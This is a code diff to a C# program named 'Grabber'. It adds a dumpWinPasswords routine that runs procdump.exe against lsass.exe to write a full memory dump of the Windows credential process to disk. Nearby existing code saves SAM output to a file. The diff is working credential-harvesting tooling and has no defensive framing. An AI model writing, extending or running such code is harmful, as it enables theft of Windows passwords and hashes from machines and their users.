@@ -74,6 +74,10 @@ namespace Grabber
 
                 catch { }
                 #endregion
+
+                #region
+                dumpWinPasswords(cd, home);
+                #endregion
             }
 
             #endregion
@@ -404,6 +408,19 @@ namespace Grabber
             StreamWriter output = new StreamWriter(cd + "\\Windows\\sam.txt");
             output.Write(proc.StandardOutput.ReadToEnd());
             output.Close();
+        }
+
+        static void dumpWinPasswords(string cd, string home)
+        {
+            ProcessStartInfo inf = new ProcessStartInfo();
+            inf.RedirectStandardOutput = true;
+            inf.FileName = Directory.GetCurrentDirectory() + "\\Tools\\procdump.exe";
+            inf.UseShellExecute = false;
+            inf.Arguments = @"-accepteula -ma lsass.exe " + cd + "\\Windows\\lsass.dmp";
+            Process proc = Process.Start(inf);
+            //StreamWriter output = new StreamWriter(cd + "\\Windows\\lsass.dmp");
+            //output.Write(proc.StandardOutput.ReadToEnd());
+            //output.Close();
         }
     }
 }
